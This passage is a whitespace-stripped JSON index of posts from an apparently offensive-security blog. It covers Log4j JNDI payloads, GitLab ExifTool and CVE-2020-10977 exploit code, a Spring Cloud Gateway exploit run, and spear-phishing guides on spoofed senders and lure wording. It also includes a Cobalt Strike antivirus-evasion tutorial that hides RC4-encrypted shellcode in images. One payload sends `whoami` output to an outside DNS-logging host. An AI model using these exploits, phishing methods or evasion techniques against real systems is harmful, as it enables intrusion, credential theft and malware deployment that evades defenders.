    "content"  : "ApacheLog4j-v2RCElimit对比表JDKlog4j-core/log4j-apisetPropertyRCE8u181(&lt;8u191)2.14.0⭕(RMI/LDAP)⭕(RMI/LDAP)8u181(&lt;8u191)2.14.0❌(RMI/LDAP)⭕(LDAP)8u181(&lt;8u191)2.14.0❌(RMI/LDAP)❌(RMI)8u332(&gt;8u191)2.14.0⭕(RMI/LDAP)⭕(RMI)8u332(&gt;8u191)2.14.0⭕(RMI/LDAP)❌(LDAP)8u332(&gt;8u191)2.14.0❌(RMI/LDAP)❌(RMI/LDAP)JDKJDK6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMIClassLoader的安全性。JDK6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。JDK6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。setPropertySystem.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");suchas:importorg.apache.logging.log4j.LogManager;importorg.apache.logging.log4j.Logger;publicclasslog4j{privatestaticLoggerlogger=LogManager.getLogger(log4j.class);publicstaticvoidmain(String[]args){System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\",\"true\");System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");logger.error(\"${jndi:rmi://192.168.3.50:4001/#Exploit}\");}}RCEPROTOCOLRMILDAP-${jndi:rmi://..}${jndi:ldap://..}⭕(RMI)⭕❌⭕(LDAP)❌⭕⭕(RMI/LDAP)⭕⭕RefLOG4JJavaexploit-WAFandpatchesbypasstricksCVE-2021-44228-JNDIcodeexec"
  },

  {
    "title"    : "Apereo CAS < 4.2.x 反序列化远程代码执行",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apereo-CAS-Less-than-4-2-x-RCE/",
    "date"     : "Jun 6, 2022",
    "content"  : "CAS靶场搭建CAS::Maven仓库地址cas-server-webapp::4.1.6cas-server-webapp::4.2.7分别进入下载Pom或者War，不想麻烦直接下载WAR包放到tomcatweb文件夹就行。如何发现CAS资产ApereoCentralAuthenticationService版本通过路由404报错查看版本：https://cas.example.com/cas/iwana404;)在CAS访问404资源时跳转302，本地不管是否配置HTTPS证书都不会返回404页面，所以排除了HTTPS证书的可能性；TomcatSSLCert或者页脚处本身也会体现版本：登录Post请求包个性参数POSThttp://localhost:8000/login;jsessionid=1653784B0F427BE086AD4EC81386726DHTTP/1.1Host:localhost:8000username=admin&amp;password=123&amp;execution=如上面所示的execution参数（也是反序列化的入口）"
  },

  {
    "title"    : "GitLab CVE-2021-22205 snippet RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Gitlab-RCE-with-snippet-function/",
    "date"     : "May 18, 2022",
    "content"  : "复现Createanewsnippet登录创建一个仓库，并且创建新的snippetInthedescriptionfield,hit\"Attachafile\";Selectanduplaodecho_vakzz.jpgecho_vakzz.jpg上传附件Seethatthefile/tmp/vakzzhasbeencreatedontheserver也可以通过未授权RCE，具体可以查看(CVE-2021-22205)RCE-七、手工复现-未授权制作rce图片可直接编辑，修改下面的代码就好；或者上面的文章中[六、手工复现-有授权-2DjVu格式图片制作方式]也有相应的制作方法。qx{ping`whoami`.5pxha.i3ntq7.bnslog.top}效果分析如作者在报告里所说：Whenuploadingimagefiles,GitLabWorkhorsepassesanyfileswiththeextensions[jpg|jpeg|tiff]throughtoExifTooltoremoveanynon-whitelistedtags.上传图像文件时，GitLabWorkhorse会将任何扩展名为jpg|jpeg|tiff的文件传递给ExifTool，以删除任何未列入白名单的标签。funcIsExifFile(filenamestring)bool{\tfilenameMatch:=regexp.MustCompile(`(?i)\\.(jpg|jpeg|tiff)$`)\treturnfilenameMatch.MatchString(filename)}OneofthesupportedformatsisDjVu.WhenparsingtheDjVuannotation,thetokensareevaledto“convertCescapesequences”.(metadata\t(Copyright\"\\\".qx{echovakzz&gt;/tmp/vakzz}.\\\"b\"))参考HackerOne-RCEwhenremovingmetadatawithExifToolGitLab远程命令执行漏洞复现(CVE-2021-22205)"
  },

  {
    "title"    : "鱼叉攻击策略落地：邮件网关应用",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/2022-05-17-Harpoon-strategy-attack-EmailGateway-usage/",
    "date"     : "May 17, 2022",
    "content"  : "实现：如何尽可能快的落地邮件网关，并实现具有一定欺骗性的钓鱼邮件。零、快速上场我们这里使用的是SendCloud，注册进入后先后顺序：添加域名DNS验证如何在DNS平台上配置域名？创建API_USER并关联域名得到apiuser及apikey添加邮件模版得到templateInvokeName不过上面的SendCloud平台，免费方案至多只允许每天10封邮件，您可以查看更多解决方案点击查看这里到此为止我们配置完成，上面有三个值需要我们记下，进入SendCloudDOC页面找到发送代码doc/email_v2/code/代码示例Python::模板发送您也可以自行选择不同语言；下载并把相关的配置参数填入，自定义：fromNamefromsubject运行即可：python3sendcloud_bin4xin_telecom.py{\"result\":true,\"statusCode\":200,\"message\":\"请求成功\",\"info\":{\"emailIdList\":[\"1$nd0$bin4xin[at]sentrylab.cn\"]}}然后我们就会收到一封有一定具有迷惑性的邮件：客户端效果：手机端效果：不过这样是有局限性的，有心的话可以通过web端打开，甚至都不用打开邮件详情看：发件人：网络和信息安全管理部-终端威胁管理部门&lt;soc_adminis[at]***lecom.com.cn&gt;(由ce2b1168-d591-1***.com代发)一、链接小细节域名punycode编码原理简单的超链接&lt;ahref=\"http://www.eval.me\"&gt;www.aliyun.com&lt;/a&gt;…二、钓鱼内容相关以下内容写的很贴切，我这里做了转载:钓鱼邮件的投递和伪造钓鱼邮件通常有两大类，一种是链接钓鱼邮件，通常是想各种办法让目标打开网站，输入密码。另一种是附件钓鱼邮件，但不管哪一类，都需要一个好的文案来让目标点击或者下载。一封成功的钓鱼邮件，一个好的文案是必须的，一个让人看了后可能会去点的文案，需要具备以下几个要素：重要性首先得让体现出来邮件的重要性，来驱使目标去查看邮件。合理性其次文案得基本合理，这个就需要结合目标的身份，日常习惯，所在公司的情况及业务进行综合考量，来编写出一个合理的文案。紧迫性最后文案最好有一些紧迫性，来促使目标尽快的去按照文案引导，进行点击、输入等操作。三、参考钓鱼邮件的投递和伪造SendCloudAPIDOCSpunycode以上。"
  },

  {
    "title"    : "鱼叉攻击策略落地：从零到一",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Harpoon-strategy-attack-from-0-to-1/",
    "date"     : "May 16, 2022",
    "content"  : "邮件网关的选择鱼叉攻击策略落地：邮件网关应用钓鱼邮件的投递和伪造提高送达成功率适当控制发信的频率，如果短时间内向同一个邮箱地址发信，也会容易被标记为垃圾邮件。最好向同一邮箱发信间隔在2-5天将较大的收件人列表分割成若干个小的，分时间段发送使用变量，一般来说，邮件服务器多次收到来自同一个邮件IP地址的相同内容邮件，很容易就被判定为垃圾邮件。在进行邮件编辑时，多采用变量设置，像公司名、收件人，可以进行变量添加，避免邮件内容完全一致载荷/CobaltStikeCobaltStike备忘录I:COBALTSTIKE服务器搭建历程CobaltStike备忘录II:COBALTSTIKE服务器隐藏真实IPCS上线木马免杀入门这一部分是我们邮件中的payload/载荷，钓鱼邮件不管是发送附件上线还是钓鱼网站，我们总要对输出的”产品”接近完善，不管哪一类，都需要一个好的文案来让目标点击或者下载。发文信息搜集确定用户/员工邮箱靶标确定发文内容发文单位常见发文口吻发文域名伪造上面两个小节其实有很多细节可以深究，包括CS端的指纹去除防止被网络测绘，CDN上线等等。参考钓鱼邮件的投递和伪造SendCloudAPIDOCSpunycode"
  },

  {
    "title"    : "GitLab CVE-2020-10977 任意文件读取漏洞导致的RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/GitLab-CVE-2020-10977-RCE/",
    "date"     : "May 5, 2022",
    "content"  : "概述GitLab是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。GitLab是由GitLabInc.开发使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。如何查看GitlabWeb版本https://git-lab-domain.com/help如果没有相关版本，那么需要先登录如果您是运维人员，可以输入以下命令查看：$cat/opt/gitlab/embedded/service/gitlab-rails/VERSION零、概述由GitLabCVE-2020-10977任意文件读取漏洞导致的RCE0x01、影响版本暂未可知；通过作者在Hackerone的报告显示测试环境是：GitLabinformationVersion:12.8.7-eeRevision:2643fd87200并且通过Gitlab官方的反馈是：YourfindinghasbeenpatchedinGitLabversion12.9.1或许结合漏洞来源，一个可参考的说法是：GitLabGitLabCE/EE&gt;=8.5and&lt;12.9GitLabGitLabCE&gt;=8.5，&lt;12.90x02、环境搭建服务/受害端$dockerrun-itgitlab/gitlab-ee:{version.label}bash或者yum安装；我这里的本地环境是选择与报告者@vakzz一样的版本GitLabinformationVersion:12.8.7-eeRevision:2643fd87200Directory:/opt/gitlab/embedded/service/gitlab-railsDBAdapter:PostgreSQL点击以下载GitLabVer12.8.7-ee或者使用下面的命令下载：on:push:branches:-main-'releases/**'wget--content-dispositionhttps://packages.gitlab.com/gitlab/gitlab-ee/packages/scientific/7/gitlab-ee-12.8.7-ee.0.el7.x86_64.rpm/download.rpm安装yum-yinstall./gitlab......12_8.7.rpmTIPS:1.gitlab-ctlrestart后访问Gitlab返回502，再运行gitlab-ctlreconfigure即可。2.gitlab-ctlreconfigure如果报错Nosuchfileordirectory，运行以下命令touch/opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.sem.conftouch/opt/gitlab/embedded/etc/90-omnibus-gitlab-kernel.shmall.conftouch/opt/gitlab/embedded/etc/90-omnibus-gitlab-net.core.somaxconn.conf0x03、复现攻击端：先pull镜像，方便用console生成反序列化Cookiedockerpullgitlab/gitlab-ee:12.8.1-ee.0进入console$/opt/gitlab/embedded/bin/runsvdir-start&amp;$gitlab-ctlreconfigure$vi/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml#替换secret_key_base为服务/受害端的secret_key_base$gitlab-railsconsole需要注意的是，修改配置yml文件后，就不需要reconfigure了，不然生成新的secret_key_base会覆盖修改的。gitlab-railsconsole攻击代码request=ActionDispatch::Request.new(Rails.application.env_config)request.env[\"action_dispatch.cookies_serializer\"]=:marshalcookies=request.cookie_jarerb=ERB.new(\"&lt;%=`echofromCVE-2020-10977&gt;/tmp/flags`%&gt;\")depr=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,\"@result\",ActiveSupport::Deprecation.new)cookies.signed[:cookie]=deprputscookies[:cookie]访问：$curl-k-vvv'https://git-lab-domain.com/users/sign_in'-b\"experimentation_subject_id={cookies[:cookie]}\"当然，我们也编写了相关的EXP供查阅，权当抛砖引玉；Bigger-than-Bigger::CoVV/Gitlab/CVE-2020-10977::cookie_generater.shC(ollection)O(f)V(erified)V(ulnerabilities):cookie_generater.shinhttps://github.com/Bin4xin/bigger-than-biggerAuthor:bin4xin&lt;bin4xin@sentrylab.cn&gt;Bashscriptstogeneratecookiesoutof[gitlab-railsconsole].(RCEduetoCVE-2020-10977&lt;localfileread&gt;)visithttps://hackerone.com/reports/827052______||__(_)______________||_||_________||__(_)___________|'_\\||/_\\|/_\\|/-_)|'_||___||_||'\\/_|||'\\|___||'_\\||/_\\|/_\\|/-_)|'_||_.__/|_|\\__,|\\__,|\\___||_|\\__||_||_|\\__,_||_||_||_.__/|_|\\__,|\\__,|\\___||_||___/|___/|___/|___/USAGE:bashcookie_generater.shcommand[$command][$url]SUCHAS:bashcookie_generater.sh[cmd|--cmd|-c]\"touch/tmp/success\"8.8.8.8[help|--help|-h]:\t\tprinthelpmessage.打印帮助信息[cmd|--cmd|-c]:\t\tgeneratecookiesmode.生成COOKIE[$command]:\t\tcommandyouwanttoexecute.要执行的命令[$url]:\t\tgitlabvulnurl(unnecessary).gitlab地址，非必要有兴趣可以点击链接查看，欢迎斧正。一、思考1x01、代码分析#/opt/gitlab/embedded/service/gitlab-rails/config/initializers/cookies_serializer.rb#Besuretorestartyourserverwhenyoumodifythisfile.Rails.application.config.action_dispatch.use_cookies_with_metadata=falseRails.application.config.action_dispatch.cookies_serializer=:hybrid作者提到cookies_serializer.rb中默认的cookies_serializer=:hybrid导致了RCE；多说一句，插入Cookie这个利用方式和Shiro反序列化WEB利用方式有点像(o_O)二、修复2x01、关闭注册功能大部分问题都是通过匿名用户注册后，在仓库内操作导致的问题，故：取消游客的注册能够减少80%的问题以Admin用户登录后，进入：AdminArea-&gt;Setting-&gt;Sign-uprestrictions确保Sign-upRestrictions下Sign-upenabled为未勾选状态。2x02、更新版本但取消注册后，或许仍然有一些不需要授权的漏洞，所以尽可能保持软件的版本与上游版本保持一致；三、参考于2022-10-21修改Hackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissueGithub404::CVE-2020-10977Gitlab任意文件读取导致远程命令执行GitLab任意文件读取漏洞复现(CVE-2020-10977)GitLab任意文件读取漏洞CVE-2020-10977HackTheBox—LaboratoryWriteupCentOS7手把手教你搭建gitlab环境gitlab注销注册功能"
  },

  {
    "title"    : "GitLab CVE-2020-10977 任意文件读取漏洞",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/GitLab-CVE-2020-10977/",
    "date"     : "Apr 29, 2022",
    "content"  : "概述GitLab是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务。GitLab是由GitLabInc.开发使用MIT许可证的基于网络的Git仓库管理工具，且具有wiki和issue跟踪功能。使用Git作为代码管理工具，并在此基础上搭建起来的web服务。如何查看GitlabWeb版本https://git-lab-domain.com/help如果没有相关版本，那么需要先登录如果您是运维人员，可以输入以下命令查看：$cat/opt/gitlab/embedded/service/gitlab-rails/VERSION12.8.1-ee零、CVE-2020-109770x01、CVE-2020-10977漏洞概述在Gitlab8.5-12.9版本中，存在一处任意文件读取漏洞，攻击者可以利用该漏洞，在不需要特权的状态下，读取任意文件，造成严重信息泄露，从而导致进一步被攻击的风险。0x02、影响版本GitLabGitLabCE/EE&gt;=8.5and&lt;=12.9GitLabGitLabCE&gt;=8.5，&lt;=12.90x03、环境搭建点击以查看本地搭建漏洞版本此处不多赘述[root@ingeekbin4xin]#systemctlstopfirewalld#CentOS关闭防火墙[root@ingeekbin4xin]#systemctldisablefirewalld.service#CentOS取消防火墙自启动[root@ingeekbin4xin]#systemctlstatusfirewalld●firewalld.service-firewalld-dynamicfirewalldaemonLoaded:loaded(/usr/lib/systemd/system/firewalld.service;enabled;vendorpreset:enabled)Active:inactive(dead)sinceWed2022-05-0422:11:30EDT;4sagoDocs:man:firewalld(1)Process:7299ExecStart=/usr/sbin/firewalld--nofork--nopid$FIREWALLD_ARGS(code=exited,status=0/SUCCESS)MainPID:7299(code=exited,status=0/SUCCESS)May0422:10:48ingeeksystemd[1]:Stoppedfirewalld-dynamicfirewalldaemon.May0422:10:48ingeeksystemd[1]:Startingfirewalld-dynamicfirewalldaemon...May0422:10:48ingeeksystemd[1]:Startedfirewalld-dynamicfirewalldaemon.May0422:10:48ingeekfirewalld[7299]:WARNING:AllowZoneDriftingisenabled.Thisisconsideredaninsecureconfigurationoption.Itwillberemovedinafuturerelease.Pleaseconsiderdisablingitnow.May0422:11:29ingeeksystemd[1]:Stoppingfirewalld-dynamicfirewalldaemon...May0422:11:30ingeeksystemd[1]:Stoppedfirewalld-dynamicfirewalldaemon.或者Docker：ReplicatingtheGitLabCE12.8.1Environment$sudoaptinstalldocker.io$dockerpullgitlab/gitlab-ce:12.8.1-ce.0$dockerrungitlab/gitlab-ce:12.8.1-ce.0Itwilltakefewminstorunthecontainertostart,inanewterminalwecancheckthedockerprocessandsimultaneouslygetashellonit.0x04、漏洞复现1.在首页随便创建一个账号，然后登陆；2.登录后创建两个project/仓库，名字随意；3.两个project创建完成后，在test1中创建一个issues。填入payload；![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)4.提交后，将这个创建好的issuesmove到前面创建好的另外一个project/仓库中；4.1进入issues-&gt;编辑-&gt;移动5.点击passwd附件6.enjoy一、CVE-2020-10977思考为什么移动issues的时候，可以读取到文件呢？1x01、猜测显而易见，当创建issues的时候，我们提交上去的markdown代码被解析成了html代码，即：&lt;imgsrc=\"https://git-lab-domain.com/ysoserial/ysoserial/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd\"alt=\"a\"&gt;那么问题肯定出现在代码移动时，错误解析到了本地文件上，那么是哪里呢？带着这样的疑问，去查看了相关的文章和代码；Hackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissue1x02、代码分析作者提出：TheUploadsRewriterdoesnotvalidatethefilename,allowingarbitraryfilestobecopiedviadirectorytraversalwhenmovinganissuetoanewproject.Thepatternusedtolookforreferencesis:UploadsRewriter不验证文件名，允许在将问题移动到新项目时通过目录遍历复制任意文件，寻找引用的模式如下：MARKDOWN_PATTERN=%r{\\!?\\[.*?\\]\\(/uploads/(?&lt;secret&gt;[0-9a-f]{32})/(?&lt;file&gt;.*?)\\)}.freeze%r为正则表达，用法可以参考：相关用法并且：ThisisusedbytheUploadsRewriterwhencopyinganissuetoalsocopyacrossthefiles:在当拷贝issue时同时也能够实现能够跨文件复制，就是因为UploadsRewriter的使用：#/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/gfm/uploads_rewriter.rb:@text.gsub(@pattern)do|markdown|file=find_file(@source_project,$~[:secret],$~[:file])breakmarkdownunlessfile.try(:exists?)klass=target_parent.is_a?(Namespace)?NamespaceFileUploader:FileUploadermoved=klass.copy_to(file,target_parent)...deffind_file(project,secret,file)uploader=FileUploader.new(project,secret:secret)uploader.retrieve_from_store!(file)uploaderend二、修复2x01、关闭注册功能大部分问题都是通过匿名用户注册后，在仓库内操作导致的问题，故：取消游客的注册能够减少80%的问题以Admin用户登录后，进入：AdminArea-&gt;Setting-&gt;Sign-uprestrictions确保Sign-upRestrictions下Sign-upenabled为未勾选状态。2x02、更新版本但取消注册后，或许仍然有一些不需要授权的漏洞，所以尽可能保持软件的版本与上游版本保持一致；三、参考Hackerone-ArbitraryfilereadviatheUploadsRewriterwhenmovingandissueCVE-2020-10977Gitlab任意文件读取导致远程命令执行GitLab任意文件读取漏洞复现(CVE-2020-10977)GitLab任意文件读取漏洞CVE-2020-10977HackTheBox—LaboratoryWriteupCentOS7手把手教你搭建gitlab环境gitlab注销注册功能"
  },

  {
    "title"    : "未授权MongoDB：鸿门宴？",
    "category" : "",
    "tags"     : "笔记",
    "url"      : "/blog/2022/mongoDB-unauth-pentest-walkthrough/",
    "date"     : "Apr 5, 2022",
    "content"  : "记一次自己菜鸟的模样渗透中发现一个mongoDB的端口，尝试连上去后发现什么数据都读不到，诚惶诚恐，越往下越感觉和MysqlDServer伪造读取文件的现象接近，乃大恐；战战兢兢如履薄冰，无奈默默打开wireshark，重新连接一次数据库端口，记录之。fakemysqlD前置知识：《伪造mysql服务实现任意文件下载漏洞》问题主要是出在LOADDATAINFILE这个语法上，这个语法主要是用于读取一个文件的内容并且放到一个表中。这两种用法的区别就是差了一个local，第一个SQL语句的意思是，读取服务器上/etc/passwd文件，并写入到TestTable中；第二个SQL语句的意思则是，读取本地（客户端）这边的/etc/passwd文件，并写入到TestTable中样例写法可以是：loaddatainfile\"/etc/passwd\"intotableTestTable;loaddatalocalinfile\"/etc/passwd\"intotableTestTable;一切看上去很正常连接上去后并没有发现有什么特殊的地方，表达式也能执行：test&gt;0x10+0x10[2022-03-2909:46:34]1rowretrievedstartingfrom1in578ms(execution:546ms,fetching:32ms)[2022-03-2909:47:45]Connectedtest&gt;usetest[2022-03-2909:47:46]completedin266mstest&gt;0x10+0x10大惑：咦？难道现在fakeserver的脚本这么厉害了？都能够有交互了？高交互式蜜罐？mongodb-traffic-log直到看了上面这个报文，找遍了整个包没有发现”不可告人的秘密”，才放下半颗心；各位看着一笑就好，被自己菜哭了。"
  },

  {
    "title"    : "CVE-2022-22947 Spring-Cloud-Gateway-RCE",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CVE-2022-22947-Spring-Cloud-Gateway-RCE/",
    "date"     : "Mar 15, 2022",
    "content"  : "开源项目SpringCloudGateway的一个远程代码执行漏洞编号为CVE-2022-22947受影响的版本为：3.1.03.0.0到3.0.6旧的不受支持的版本也受影响漏洞挖掘靶场：java-jarspring-gateway-demo-0.0.1-SNAPSHOT.jar--debug._________/\\\\/___'_____(_)______\\\\\\\\(()\\___|'_|'_||'_\\/_`|\\\\\\\\\\\\/___)||_)|||||||(_||))))'|____|.__|_||_|_||_\\__,|////=========|_|==============|___/=/_/_/_/::SpringBoot::(v2.6.3-SNAPSHOT)Nettystartedonport9000gateway网关关键词$curlhttp://localhost:9000/actuator{\"_links\":{\"self\":{\"href\":\"http://localhost:9000/actuator\",\"templated\":false},\"gateway\":{\"href\":\"http://localhost:9000/actuator/gateway\",\"templated\":false}}}exp原仓库$gitremote-vorigin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git(fetch)origin\thttps://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.git(push)$gobuildmain.gogo:downloadinggithub.com/panjf2000/ants/v2v2.4.8go:downloadinggithub.com/go-resty/resty/v2v2.7.0go:downloadinggolang.org/x/netv0.0.0-20211029224645-99673261e6eb$./main-uhttp://127.0.0.1:9000-cwhoamihttp://127.0.0.1:9000'bin4xin\\n'修复方案3.1.x版本用户应升级到3.1.1+版本，3.0.x版本用户应升级到3.0.7+版本。在不影响业务的前提下，通过将配置选项management.endpoint.gateway.enabled设置为false禁用gatewayactuatorendpoint。检测思路流量检测：分析HTTP流量，检测是否存在异常访问actuatorgatewayAPI的请求。2022-03-1510:22:26.711DEBUG11029---[ctor-http-nio-2]o.s.w.s.adapter.HttpWebHandlerAdapter:[68b629bb-1]HTTPPOST\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-2]a.e.w.r.ControllerEndpointHandlerMapping:[68b629bb-1]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#save(String,RouteDefinition)[ctor-http-nio-2].r.m.a.RequestBodyMethodArgumentResolver:[68b629bb-1]Content-Type:application/json[ctor-http-nio-2].r.m.a.RequestBodyMethodArgumentResolver:[68b629bb-1]0..1[org.springframework.cloud.gateway.route.RouteDefinition][ctor-http-nio-2]o.s.http.codec.json.Jackson2JsonDecoder:[68b629bb-1]Decoded[RouteDefinition{id='LZQXX',predicates=[],filters=[FilterDefinition{name='AddResponseHeader',args=(truncated)...][ctor-http-nio-2]o.s.w.s.adapter.HttpWebHandlerAdapter:[68b629bb-1]Completed201CREATED[ctor-http-nio-3]o.s.w.s.adapter.HttpWebHandlerAdapter:[36032421-2]HTTPPOST\"/actuator/gateway/refresh\"[ctor-http-nio-3]a.e.w.r.ControllerEndpointHandlerMapping:[36032421-2]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()[ctor-http-nio-3]o.s.w.s.adapter.HttpWebHandlerAdapter:[36032421-2]Completed200OK[ctor-http-nio-4]o.s.w.s.adapter.HttpWebHandlerAdapter:[9763438e-3]HTTPGET\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-4]a.e.w.r.ControllerEndpointHandlerMapping:[9763438e-3]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#route(String)[ctor-http-nio-4].s.w.r.r.m.a.ResponseEntityResultHandler:[9763438e-3]Using'application/json'given[*/*]andsupported[application/json,application/*+json,application/x-ndjson,text/event-stream][ctor-http-nio-4].s.w.r.r.m.a.ResponseEntityResultHandler:[9763438e-3]0..1[java.util.Map&lt;java.lang.String,java.lang.Object&gt;][ctor-http-nio-4]o.s.http.codec.json.Jackson2JsonEncoder:[9763438e-3]Encoding[{predicate=RouteDefinitionRouteLocator$$Lambda$918/2002125647,route_id=LZQXX,filters=[[[AddRespons(truncated)...][ctor-http-nio-4]o.s.w.s.adapter.HttpWebHandlerAdapter:[9763438e-3]Completed200OK[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-4]HTTPDELETE\"/actuator/gateway/routes/LZQXX\"[ctor-http-nio-5]a.e.w.r.ControllerEndpointHandlerMapping:[1f92a2eb-4]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#delete(String)[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-4]Completed200OK[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-5]HTTPPOST\"/actuator/gateway/refresh\"[ctor-http-nio-5]a.e.w.r.ControllerEndpointHandlerMapping:[1f92a2eb-5]Mappedtoorg.springframework.cloud.gateway.actuate.GatewayControllerEndpoint#refresh()[ctor-http-nio-5]o.s.w.s.adapter.HttpWebHandlerAdapter:[1f92a2eb-5]Completed200OK以上。参考SpringCloudGateway远程代码执行漏洞CVE-2022-22947远程代码执行漏洞复现分析"
  },

  {
    "title"    : "CS上线木马免杀入门",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Cobalt-Strike-beacon-bypass-walkthrough/",
    "date"     : "Feb 24, 2022",
    "content"  : "木马上线老生常谈的问题就是免杀；特别是windows免杀，安全市场经过相当长一段时间的洗礼后，国内已然涌现出很多「优秀」的安全软件；所以本篇来简单聊一下免杀入门，如何快速针对自己的需求做出一个免杀效果还不错的木马；注意/ATTENTIONPLZ!!!WindowsDefender关闭自动提交样本Windows安全中心-&gt;病毒和威胁防护-&gt;“病毒和威胁防护”设置-&gt;管理设置-&gt;自动提交样本【关】过了免杀不要传到任何沙箱1、环境GolangBasedonWindowsPythonBasedonWindow/Linux/macOSpip/pip3CS-Loader原仓库：origin\thttps://github.com/Gality369/CS-Loader.git(fetch)origin\thttps://github.com/Gality369/CS-Loader.git(push)2、实现详细过程可以参考CS-Loader仓库教程不做搬运2x01效果golang版成功通过微软Defender/火绒免杀；火绒微软Defender3、思路3x00梳理建议自己尝试一下过程，可以参考上面的README，或者我这里传了一份梳理过后的代码下面看一下图片shellcode的加密生成方式3x01图片shellcode生成#base64encodebaseStr=base64.b64encode(shellcode)#RC4+base64encodepayload=rc4(baseStr,key)withopen(imgName,'rb')asf:img=f.read()fileend=img[-2:]if(ord(fileend[0])!=255andord(fileend[0])!=217):if(img.count(chr(255)+chr(217))&gt;0):#不以ffd9结尾，但是内容中包含有ffd9，说明图片有误或者已经在ffd9后追加过内容了print(\"Pleasechangetheimg.\")exit(0)else:payload=img+chr(255)+chr(217)+payloadprint(\"Abnormalendoffile,autoadd\\xff\\xd9\")#以上判断图片的正确性以及进行图片矫正else:payload=img+payload#插入的图片插入经过rc4加密的base64(shellcode)，往下看rc4withopen(\"shellcode_\"+imgName,'wb')asf1:f1.write(payload)print(\"Payloadhaswritetoshellcode_\"+imgName)rc4：#rc4接收主方法传过来的(b64encode(shellcode),rc4加密key)defrc4(text,key):key=hashlib.md5(key).hexdigest()#Usemd5(key)toget32-bitkeyinsteadrawkeyresult=''key_len=len(key)#1.initS-boxbox=list(range(256))#put0-255intoS-boxj=0foriinrange(256):#shuffleelementsinS-boxaccordingtokeyj=(j+box[i]+ord(key[i%key_len]))%256#取模box[i],box[j]=box[j],box[i]#swapelementsi=j=0forelementintext:i=(i+1)%256j=(j+box[i])%256box[i],box[j]=box[j],box[i]k=chr(ord(element)^box[(box[i]+box[j])%256])result+=k#blablabla..result=base64.b64encode(result)returnresult加密效果：$pythongenerator.pyADdk943ZPviJWuFP5HO6HsUbbf3/UibLBKbjBQNvx314kU2L8vjUSpdIwV/cx20/2W0Skzghdf4oYRZfF1/0P+xhSgYqRXESzhXpqoLHXiVzDyezyOp9p03As6I3lXCP9w9r+CBG5VQIg3sCak05aAG1rRAoAD8L7FbzFQCbnhn+BgKe4A7J95vKyGzmFBuNiQoBqOEbNKNuF6oaXbsDTw6s9ymflG7yna8Os9zOOS4JSFZ5Ds4slcQ6pFHZK16OERLSN9x8hdjlLVKUKqTmPhl1Y3hepr2nF5G/NkS6esZTEsEJHRPcXpQineKVL/T5uxoliiLOeZdjlrGgnDGrgMC5N8O66DXyK3bGdYpVMrzj9iQzCwdXn0PdquAhAZynjtos1c6S4De9EVxbJaes6k/QeCjrkD234qPTt5c4C8zm/bhrZ0ghVAAl4LPwiPZsu5bYONMeYApBJ81IBec46RSFFN5LWzdhJEutJDx9w/AyYS1iphRShAczz6GmeVDaXeY83LhzKNKMlXNJfVv57DFDX4MiKiZq4SO5roUkUQ1mTYCG3LzdTFDhC7JQdwML2WBwubnPt8kCs6woxC0P2y5eAn77KivDovGsB3INBxqErgonfKWPgcCJVixYBfRP7FxfBYoAjw9xiiLuwDOxQaYAKGAfPI/9ctphRPWa8ZPzaJ7fpF4dO8UERVh0/IYlgeJx9hLVvEkjf9O0y1O688E1Giuo+D8pgdZo4WnsTWNBfU+woqo/34ZzxHV/3xKFlKljBD0+XoyKTLYmUju6pwv5TEfBbiMd+Hrs5Oh9s0fkKOyybuhrCEX8zrpMHcNhng996olYzcKNxCoZzDuFFvDwGkX3vXNN+GWTgKZc6lnp+hrX2Z0ZDaivLVyZU2NCS6YBq7BjEgntO2oYWlRiUXUKejHysunVUVE4LPtiO6nAJXTELd3SAXG8G4Sy5RjDK3c0GaAjvaeJ0//TpFecPPvM